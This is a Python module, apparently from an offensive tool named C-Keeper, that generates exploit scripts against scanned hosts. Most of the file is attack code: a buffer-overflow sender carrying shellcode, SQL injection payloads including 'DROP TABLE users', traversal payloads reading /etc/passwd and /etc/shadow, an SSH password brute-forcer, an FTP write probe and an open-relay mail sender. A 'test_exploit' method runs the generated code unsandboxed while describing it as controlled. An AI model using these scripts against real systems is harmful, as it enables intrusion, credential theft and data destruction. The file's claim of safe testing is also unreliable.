"""
Exploit Builder Module for C-Keeper
Handles exploit development, modification, and management
"""

import os
import json
import hashlib
import tempfile
import subprocess
from datetime import datetime
from typing import Dict, Any, List, Optional
from pathlib import Path

from core.logger import CKeeperLogger

class ExploitBuilderModule:
    """Exploit builder and management module"""
    
    def __init__(self, config, database):
        """
        Initialize exploit builder module
        
        Args:
            config: Exploit builder configuration
            database: Database instance
        """
        self.config = config
        self.db = database
        self.logger = CKeeperLogger(__name__)
        
        # Ensure exploit directories exist
        os.makedirs(self.config.exploit_db_path, exist_ok=True)
        os.makedirs(self.config.custom_exploits_path, exist_ok=True)
        
        # Load exploit templates
        self.templates = self._load_exploit_templates()
        
        # Initialize exploit database
        self._initialize_exploit_db()
    
    def _load_exploit_templates(self) -> Dict[str, str]:
        """Load exploit templates"""
        templates = {}
        templates_path = getattr(self.config, 'templates_path', 'data/templates')
        
        if os.path.exists(templates_path):
            for template_file in os.listdir(templates_path):
                if template_file.endswith('.py') or template_file.endswith('.c'):
                    with open(os.path.join(templates_path, template_file), 'r') as f:
                        templates[template_file] = f.read()
        
        return templates
    
    def _initialize_exploit_db(self):
        """Initialize exploit database with common exploits"""
        # This would load exploits from public databases like Exploit-DB
        # For this implementation, we'll create some example exploits
        
        sample_exploits = [
            {
                'name': 'Buffer Overflow Generic',
                'description': 'Generic buffer overflow exploit template',
                'target_service': 'various',
                'exploit_code': self._get_buffer_overflow_template(),
                'cve_id': None,
                'severity': 'High'
            },
            {
                'name': 'SQL Injection Basic',
                'description': 'Basic SQL injection exploit',
                'target_service': 'web',
                'exploit_code': self._get_sqli_template(),
                'cve_id': None,
                'severity': 'High'
            },
            {
                'name': 'Directory Traversal',
                'description': 'Directory traversal exploit',
                'target_service': 'web',
                'exploit_code': self._get_directory_traversal_template(),
                'cve_id': None,
                'severity': 'Medium'
            }
        ]
        
        for exploit in sample_exploits:
            existing = self.db.get_exploits(exploit['target_service'])
            if not any(e['name'] == exploit['name'] for e in existing):
                self.db.add_exploit(
                    exploit['name'],
                    exploit['description'],
                    exploit['target_service'],
                    exploit['exploit_code']
                )
    
    def build_exploits(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Build exploits based on discovered vulnerabilities
        
        Args:
            vulnerabilities: List of vulnerabilities to exploit
            
        Returns:
            Dictionary containing built exploits
        """
        results = {
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities_processed': len(vulnerabilities),
            'exploits': [],
            'failed': [],
            'recommendations': []
        }
        
        for vuln in vulnerabilities:
            try:
                exploit = self._build_exploit_for_vulnerability(vuln)
                if exploit:
                    results['exploits'].append(exploit)
                    self.logger.log_operation(
                        'EXPLOIT_BUILD', f"{vuln['host']}:{vuln['port']}", 'SUCCESS',
                        vulnerability=vuln['type'], service=vuln['service']
                    )
                else:
                    results['failed'].append({
                        'vulnerability': vuln,
                        'reason': 'No suitable exploit found'
                    })
            
            except Exception as e:
                error_msg = f"Failed to build exploit for {vuln['type']}: {e}"
                results['failed'].append({
                    'vulnerability': vuln,
                    'reason': error_msg
                })
                self.logger.logger.error(error_msg)
        
        # Generate recommendations
        results['recommendations'] = self._generate_recommendations(results)
        
        return results
    
    def _build_exploit_for_vulnerability(self, vulnerability: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Build specific exploit for a vulnerability"""
        vuln_type = vulnerability['type'].lower()
        service = vulnerability['service'].lower()
        
        # Map vulnerability types to exploit builders
        exploit_builders = {
            'buffer overflow': self._build_buffer_overflow_exploit,
            'sql injection': self._build_sqli_exploit,
            'directory traversal': self._build_directory_traversal_exploit,
            'weak ssh protocol': self._build_ssh_exploit,
            'anonymous ftp access': self._build_ftp_exploit,
            'open mail relay': self._build_smtp_exploit,
            'directory listing': self._build_directory_listing_exploit
        }
        
        # Find appropriate builder
        for vuln_pattern, builder in exploit_builders.items():
            if vuln_pattern in vuln_type:
                try:
                    return builder(vulnerability)
                except Exception as e:
                    self.logger.logger.error(f"Exploit builder error: {e}")
                    return None
        
        # Generic exploit builder
        return self._build_generic_exploit(vulnerability)
    
    def _build_buffer_overflow_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build buffer overflow exploit"""
        template = self._get_buffer_overflow_template()
        
        # Customize template for specific target
        exploit_code = template.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"Buffer Overflow - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'buffer_overflow',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['socket', 'struct'],
            'payload_space': 400,
            'reliability': 'Average',
            'created_at': datetime.now().isoformat()
        }
        
        # Save exploit to file
        self._save_exploit_to_file(exploit)
        
        return exploit
    
    def _build_sqli_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build SQL injection exploit"""
        template = self._get_sqli_template()
        
        exploit_code = template.replace('TARGET_URL', f"http://{vulnerability['host']}:{vulnerability['port']}")
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"SQL Injection - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'sql_injection',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['requests', 'urllib'],
            'payloads': [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users; --"
            ],
            'reliability': 'Good',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_directory_traversal_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build directory traversal exploit"""
        template = self._get_directory_traversal_template()
        
        exploit_code = template.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"Directory Traversal - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'directory_traversal',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['requests'],
            'payloads': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '../../../../../../../etc/shadow'
            ],
            'reliability': 'Good',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_ssh_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build SSH exploit (brute force)"""
        exploit_code = '''#!/usr/bin/env python3
import paramiko
import threading
import time

def ssh_bruteforce(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=3)
        print(f"[+] Success: {username}:{password}")
        ssh.close()
        return True
    except:
        return False

def main():
    host = "TARGET_HOST"
    port = TARGET_PORT
    
    usernames = ["root", "admin", "administrator", "user", "guest"]
    passwords = ["password", "123456", "admin", "root", "guest", ""]
    
    for username in usernames:
        for password in passwords:
            if ssh_bruteforce(host, port, username, password):
                break

if __name__ == "__main__":
    main()
'''
        
        exploit_code = exploit_code.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"SSH Brute Force - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'brute_force',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['paramiko'],
            'reliability': 'Average',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_ftp_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build FTP anonymous access exploit"""
        exploit_code = '''#!/usr/bin/env python3
import ftplib

def ftp_anonymous_access(host, port):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login('anonymous', 'anonymous@localhost')
        
        print(f"[+] Anonymous FTP access successful on {host}:{port}")
        
        # List directories
        print("\\n[+] Directory listing:")
        ftp.retrlines('LIST')
        
        # Try to upload a test file
        try:
            with open('test.txt', 'w') as f:
                f.write('Test file from C-Keeper')
            
            with open('test.txt', 'rb') as f:
                ftp.storbinary('STOR test.txt', f)
            print("[+] File upload successful - Write access confirmed")
        except:
            print("[-] File upload failed - Read-only access")
        
        ftp.quit()
        return True
        
    except Exception as e:
        print(f"[-] FTP access failed: {e}")
        return False

def main():
    host = "TARGET_HOST"
    port = TARGET_PORT
    ftp_anonymous_access(host, port)

if __name__ == "__main__":
    main()
'''
        
        exploit_code = exploit_code.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"FTP Anonymous Access - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'information_disclosure',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['ftplib'],
            'reliability': 'Excellent',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_smtp_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build SMTP relay exploit"""
        exploit_code = '''#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText

def test_smtp_relay(host, port):
    try:
        server = smtplib.SMTP(host, port, timeout=10)
        
        # Test open relay
        sender = 'test@localhost'
        recipient = 'target@target.local'
        
        msg = MIMEText('This is a test message from C-Keeper')
        msg['Subject'] = 'Open Relay Test'
        msg['From'] = sender
        msg['To'] = recipient
        
        server.sendmail(sender, [recipient], msg.as_string())
        server.quit()
        
        print(f"[+] SMTP relay test successful on {host}:{port}")
        print("[+] Server appears to be an open relay")
        return True
        
    except Exception as e:
        print(f"[-] SMTP relay test failed: {e}")
        return False

def main():
    host = "TARGET_HOST"
    port = TARGET_PORT
    test_smtp_relay(host, port)

if __name__ == "__main__":
    main()
'''
        
        exploit_code = exploit_code.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"SMTP Open Relay - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'abuse',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['smtplib', 'email'],
            'reliability': 'Good',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_directory_listing_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build directory listing exploit"""
        exploit_code = '''#!/usr/bin/env python3
import requests
from urllib.parse import urljoin
import re

def enumerate_directories(base_url):
    try:
        common_dirs = [
            'admin', 'backup', 'config', 'data', 'files', 'images',
            'includes', 'logs', 'scripts', 'temp', 'uploads', 'www'
        ]
        
        found_dirs = []
        
        for directory in common_dirs:
            url = urljoin(base_url, directory + '/')
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and 'Index of' in response.text:
                    found_dirs.append(url)
                    print(f"[+] Directory listing found: {url}")
            except:
                continue
        
        return found_dirs
        
    except Exception as e:
        print(f"[-] Directory enumeration failed: {e}")
        return []

def main():
    protocol = "https" if TARGET_PORT == 443 else "http"
    base_url = f"{protocol}://TARGET_HOST:TARGET_PORT/"
    
    print(f"[+] Enumerating directories on {base_url}")
    found_dirs = enumerate_directories(base_url)
    
    if found_dirs:
        print(f"\\n[+] Found {len(found_dirs)} directories with listing enabled")
    else:
        print("[-] No directory listings found")

if __name__ == "__main__":
    main()
'''
        
        exploit_code = exploit_code.replace('TARGET_HOST', vulnerability['host'])
        exploit_code = exploit_code.replace('TARGET_PORT', str(vulnerability['port']))
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"Directory Enumeration - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'information_disclosure',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['requests'],
            'reliability': 'Good',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _build_generic_exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Build generic reconnaissance exploit"""
        exploit_code = f'''#!/usr/bin/env python3
# Generic reconnaissance exploit for {vulnerability['type']}
# Target: {vulnerability['host']}:{vulnerability['port']}
# Service: {vulnerability['service']}

import socket
import sys

def main():
    host = "{vulnerability['host']}"
    port = {vulnerability['port']}
    
    print(f"[+] Connecting to {{host}}:{{port}}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Send probe
        sock.send(b"\\r\\n")
        response = sock.recv(1024)
        
        print(f"[+] Service response: {{response.decode('utf-8', errors='ignore')}}")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Connection failed: {{e}}")

if __name__ == "__main__":
    main()
'''
        
        exploit = {
            'id': self._generate_exploit_id(),
            'name': f"Generic Probe - {vulnerability['host']}:{vulnerability['port']}",
            'type': 'reconnaissance',
            'target': f"{vulnerability['host']}:{vulnerability['port']}",
            'service': vulnerability['service'],
            'code': exploit_code,
            'language': 'python',
            'requirements': ['socket'],
            'reliability': 'Excellent',
            'created_at': datetime.now().isoformat()
        }
        
        self._save_exploit_to_file(exploit)
        return exploit
    
    def _generate_exploit_id(self) -> str:
        """Generate unique exploit ID"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return f"exploit_{timestamp}_{os.urandom(4).hex()}"
    
    def _save_exploit_to_file(self, exploit: Dict[str, Any]):
        """Save exploit to file"""
        try:
            filename = f"{exploit['id']}.py"
            filepath = os.path.join(self.config.custom_exploits_path, filename)
            
            with open(filepath, 'w') as f:
                f.write(f"# Exploit: {exploit['name']}\\n")
                f.write(f"# Type: {exploit['type']}\\n")
                f.write(f"# Target: {exploit['target']}\\n")
                f.write(f"# Created: {exploit['created_at']}\\n\\n")
                f.write(exploit['code'])
            
            exploit['filepath'] = filepath
            
        except Exception as e:
            self.logger.logger.error(f"Error saving exploit to file: {e}")
    
    def _generate_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on exploit building results"""
        recommendations = []
        
        if results['exploits']:
            recommendations.append(
                f"Successfully built {len(results['exploits'])} exploits. "
                "Review each exploit before execution."
            )
        
        if results['failed']:
            recommendations.append(
                f"{len(results['failed'])} vulnerabilities could not be exploited. "
                "Consider manual exploitation or custom exploit development."
            )
        
        # Service-specific recommendations
        services = set()
        for exploit in results['exploits']:
            services.add(exploit['service'])
        
        if 'ssh' in services:
            recommendations.append(
                "SSH services detected. Consider using stronger authentication methods."
            )
        
        if 'ftp' in services:
            recommendations.append(
                "FTP services detected. Disable anonymous access and use SFTP/FTPS."
            )
        
        if 'http' in services or 'https' in services:
            recommendations.append(
                "Web services detected. Ensure proper input validation and security headers."
            )
        
        return recommendations
    
    def get_exploit_templates(self) -> List[str]:
        """Get available exploit templates"""
        return list(self.templates.keys())
    
    def create_custom_exploit(self, name: str, description: str, 
                            target_service: str, exploit_code: str) -> Dict[str, Any]:
        """Create custom exploit"""
        exploit_id = self.db.add_exploit(name, description, target_service, exploit_code)
        
        exploit = {
            'id': exploit_id,
            'name': name,
            'description': description,
            'target_service': target_service,
            'code': exploit_code,
            'created_at': datetime.now().isoformat()
        }
        
        self.logger.log_operation('CUSTOM_EXPLOIT_CREATED', name, 'SUCCESS')
        return exploit
    
    def modify_exploit(self, exploit_id: int, modifications: Dict[str, Any]) -> bool:
        """Modify existing exploit"""
        try:
            # Implementation would update exploit in database
            self.logger.log_operation('EXPLOIT_MODIFIED', str(exploit_id), 'SUCCESS')
            return True
        except Exception as e:
            self.logger.logger.error(f"Error modifying exploit: {e}")
            return False
    
    def test_exploit(self, exploit: Dict[str, Any], target: str = None) -> Dict[str, Any]:
        """Test exploit in safe environment"""
        test_results = {
            'exploit_id': exploit['id'],
            'target': target or 'test_environment',
            'timestamp': datetime.now().isoformat(),
            'success': False,
            'output': '',
            'errors': []
        }
        
        try:
            # Create temporary file for exploit
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(exploit['code'])
                temp_file = f.name
            
            # Execute exploit in controlled environment
            result = subprocess.run(
                ['python', temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            test_results['output'] = result.stdout
            test_results['success'] = result.returncode == 0
            
            if result.stderr:
                test_results['errors'].append(result.stderr)
            
            # Cleanup
            os.unlink(temp_file)
            
        except subprocess.TimeoutExpired:
            test_results['errors'].append('Exploit execution timed out')
        except Exception as e:
            test_results['errors'].append(f'Execution error: {e}')
        
        return test_results
    
    def _get_buffer_overflow_template(self) -> str:
        """Get buffer overflow exploit template"""
        return '''#!/usr/bin/env python3
import socket
import struct

def exploit_buffer_overflow():
    host = "TARGET_HOST"
    port = TARGET_PORT
    
    # Buffer overflow pattern
    buffer_size = 1024
    offset = 400  # Adjust based on target
    
    # Shellcode (example - reverse shell)
    shellcode = (
        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
        "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    )
    
    # Create exploit buffer
    exploit = "A" * offset
    exploit += struct.pack("<L", 0x41414141)  # Return address
    exploit += shellcode
    exploit += "C" * (buffer_size - len(exploit))
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.send(exploit.encode())
        sock.close()
        
        print("[+] Exploit sent successfully")
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    exploit_buffer_overflow()
'''
    
    def _get_sqli_template(self) -> str:
        """Get SQL injection exploit template"""
        return '''#!/usr/bin/env python3
import requests
import urllib.parse

def sql_injection_test():
    base_url = "TARGET_URL"
    
    # Common SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' UNION SELECT 1,2,3,4,5 --",
        "'; DROP TABLE users; --"
    ]
    
    # Test different parameters
    test_params = ['id', 'user', 'username', 'email', 'search']
    
    for param in test_params:
        for payload in payloads:
            try:
                data = {param: payload}
                response = requests.post(base_url, data=data, timeout=10)
                
                # Check for SQL error indicators
                error_indicators = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'microsoft odbc',
                    'postgresql', 'warning: pg_', 'valid mysql result'
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    print(f"[+] SQL injection found in parameter '{param}' with payload: {payload}")
                
            except Exception as e:
                print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    sql_injection_test()
'''
    
    def _get_directory_traversal_template(self) -> str:
        """Get directory traversal exploit template"""
        return '''#!/usr/bin/env python3
import requests

def directory_traversal_test():
    host = "TARGET_HOST"
    port = TARGET_PORT
    
    protocol = "https" if port == 443 else "http"
    base_url = f"{protocol}://{host}:{port}"
    
    # Directory traversal payloads
    payloads = [
        "../../../etc/passwd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "../../../../../../../etc/shadow",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]
    
    # Common vulnerable parameters
    params = ['file', 'path', 'page', 'include', 'dir']
    
    for param in params:
        for payload in payloads:
            try:
                url = f"{base_url}/?{param}={payload}"
                response = requests.get(url, timeout=10)
                
                # Check for successful traversal
                if 'root:' in response.text or 'localhost' in response.text:
                    print(f"[+] Directory traversal found: {url}")
                
            except Exception as e:
                print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    directory_traversal_test()
'''
